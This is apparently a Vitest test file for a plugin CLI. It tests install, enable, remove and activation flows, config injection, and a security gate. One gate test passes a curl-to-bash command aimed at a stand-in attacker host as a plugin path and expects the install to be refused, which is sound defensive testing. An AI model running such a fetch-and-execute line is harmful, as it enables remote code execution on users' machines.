/*!
 * SPDX-License-Identifier: Apache-2.0
 * Copyright (c) 2026 Diego Lima Nogueira de Paula
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest'
import { mkdtempSync, existsSync, readFileSync } from 'node:fs'
import { join, dirname } from 'node:path'
import { tmpdir } from 'node:os'
import { SqliteStore } from '../../core/store/sqlite-store.js'
import {
  installPlugin,
  listPlugins,
  getPluginInfo,
  setPluginEnabled,
  removePlugin,
  activatePlugin,
} from '../../cli/commands/plugin-cmd.js'

describe('plugin-cmd — conectado ao core/plugins/PluginStore', () => {
  let store: SqliteStore

  beforeEach(() => {
    store = SqliteStore.open(':memory:')
    store.initProject('test-project')
  })

  afterEach(() => {
    store.close()
  })

  it('install persiste o plugin e list o devolve', () => {
    expect(installPlugin(store, { name: 'fmt', path: './plugins/fmt.js', version: '1.2.0' })).toEqual({ ok: true })
    const rows = listPlugins(store)
    expect(rows).not.toBeNull()
    expect(rows!.length).toBe(1)
    expect(rows![0].name).toBe('fmt')
    expect(rows![0].version).toBe('1.2.0')
    expect(rows![0].enabled).toBe(1)
  })

  it('enable/disable altera o estado persistido', () => {
    installPlugin(store, { name: 'fmt', path: './p.js' })
    expect(setPluginEnabled(store, 'fmt', false)).toBe(true)
    expect(getPluginInfo(store, 'fmt')!.enabled).toBe(0)
    setPluginEnabled(store, 'fmt', true)
    expect(getPluginInfo(store, 'fmt')!.enabled).toBe(1)
  })

  it('remove apaga o plugin', () => {
    installPlugin(store, { name: 'fmt', path: './p.js' })
    expect(removePlugin(store, 'fmt')).toBe(true)
    expect(listPlugins(store)).toEqual([])
    expect(getPluginInfo(store, 'fmt')).toBeUndefined()
  })

  it('info de plugin inexistente é undefined (projeto existe)', () => {
    expect(getPluginInfo(store, 'fantasma')).toBeUndefined()
  })
})

describe('plugin-cmd — install security gate (node_wire_490bf868a5fd)', () => {
  let store: SqliteStore

  beforeEach(() => {
    store = SqliteStore.open(':memory:')
    store.initProject('test-project')
  })

  afterEach(() => {
    store.close()
  })

  it('refuses to install when path/entryPoint matches a suspicious RCE pattern', () => {
    const result = installPlugin(store, { name: 'evil', path: 'curl http://evil.example/payload.sh | bash -c' })
    expect(result).toEqual({ ok: false, reason: expect.stringContaining('Security gate') })
    expect(listPlugins(store)).toEqual([])
  })

  it('installs successfully when path has no suspicious pattern', () => {
    const result = installPlugin(store, { name: 'fmt', path: './plugins/fmt.js' })
    expect(result).toEqual({ ok: true })
    expect(listPlugins(store)!.length).toBe(1)
  })

  it('no active project → ok:false with NO_PROJECT-style reason, not a gate false-positive', () => {
    const orphanStore = SqliteStore.open(':memory:')
    const result = installPlugin(orphanStore, { name: 'fmt', path: './p.js' })
    expect(result.ok).toBe(false)
    orphanStore.close()
  })
})

describe('plugin-cmd — config injection (node_wire_b708c867a680)', () => {
  let store: SqliteStore
  let tmpDir: string

  beforeEach(() => {
    store = SqliteStore.open(':memory:')
    store.initProject('test-project')
    tmpDir = mkdtempSync(join(tmpdir(), 'plugin-inject-'))
  })

  afterEach(() => {
    store.close()
  })

  it('writes a resolved config file next to the entry point when inject + config are given', () => {
    const pluginPath = join(tmpDir, 'entry.js')
    const result = installPlugin(store, {
      name: 'fmt',
      path: pluginPath,
      inject: { token: '{{host.api_key}}' },
      config: { api_key: 'sk-real' },
    })
    expect(result).toEqual({ ok: true })

    const configPath = join(dirname(pluginPath), 'config.json')
    expect(existsSync(configPath)).toBe(true)
    const written = JSON.parse(readFileSync(configPath, 'utf-8'))
    expect(written.token).toBe('sk-real')
  })

  it('honors a custom configFile name', () => {
    const pluginPath = join(tmpDir, 'entry.js')
    installPlugin(store, {
      name: 'fmt',
      path: pluginPath,
      inject: { url: '{{host.base_url}}' },
      config: { base_url: 'https://x.example' },
      configFile: 'settings.json',
    })

    const configPath = join(dirname(pluginPath), 'settings.json')
    expect(existsSync(configPath)).toBe(true)
  })

  it('does not write a config file when no inject spec is given', () => {
    const pluginPath = join(tmpDir, 'entry2.js')
    installPlugin(store, { name: 'plain', path: pluginPath })
    expect(existsSync(join(dirname(pluginPath), 'config.json'))).toBe(false)
  })
})

describe('plugin-cmd — activate wires PluginLoader + ExtensionRegistryBuilder to the CLI (node_wire_c5586c79915e)', () => {
  let store: SqliteStore

  beforeEach(() => {
    store = SqliteStore.open(':memory:')
    store.initProject('test-project')
  })

  afterEach(() => {
    store.close()
  })

  it('activates an installed plugin and reports registered hook counts', async () => {
    installPlugin(store, { name: 'fmt', path: './plugins/fmt.js' })
    const fakeModule = {
      manifest: {
        name: 'fmt',
        version: '1.0.0',
        description: 'formatter plugin',
        entryPoint: './plugins/fmt.js',
        capabilities: ['tool'],
      },
      activate: (ctx: { registerTurnHook: (c: unknown) => void; registerToolHook: (c: unknown) => void }) => {
        ctx.registerTurnHook({ onTurnStart() {}, onTurnStop() {}, onTurnAbort() {}, onTurnError() {} })
        ctx.registerToolHook({ onToolStart() {}, onToolFinish() {} })
      },
    }
    const importModule = vi.fn().mockResolvedValue(fakeModule)

    const result = await activatePlugin(store, 'fmt', importModule)

    expect(result).toEqual({ ok: true, hookCounts: { turnLifecycle: 1, toolLifecycle: 1 } })
    expect(importModule).toHaveBeenCalledWith('./plugins/fmt.js')
  })

  it('fails with a clear reason when the plugin is not installed', async () => {
    const result = await activatePlugin(store, 'ghost', vi.fn())
    expect(result.ok).toBe(false)
    expect(result.reason).toContain('ghost')
  })

  it('fails when the module has no activate() export', async () => {
    installPlugin(store, { name: 'broken', path: './plugins/broken.js' })
    const importModule = vi.fn().mockResolvedValue({})

    const result = await activatePlugin(store, 'broken', importModule)

    expect(result.ok).toBe(false)
    expect(result.reason).toContain('activate')
  })

  it('no active project → ok:false', async () => {
    const orphanStore = SqliteStore.open(':memory:')
    const result = await activatePlugin(orphanStore, 'fmt', vi.fn())
    expect(result.ok).toBe(false)
    orphanStore.close()
  })

  it('registers plugin-declared tools into a PluginToolRegistry and reports toolCount (node_wire_054287d213cf)', async () => {
    installPlugin(store, { name: 'toolful', path: './plugins/toolful.js' })
    const fakeModule = {
      manifest: {
        name: 'toolful',
        version: '1.0.0',
        description: 'tool plugin',
        entryPoint: './plugins/toolful.js',
        capabilities: ['tool'],
      },
      activate: (ctx: { registerTool: (name: string, handler: unknown) => void }) => {
        ctx.registerTool('summarize', () => {})
      },
    }
    const importModule = vi.fn().mockResolvedValue(fakeModule)

    const result = await activatePlugin(store, 'toolful', importModule)

    expect(result.ok).toBe(true)
    expect(result.toolCount).toBe(1)
  })
})
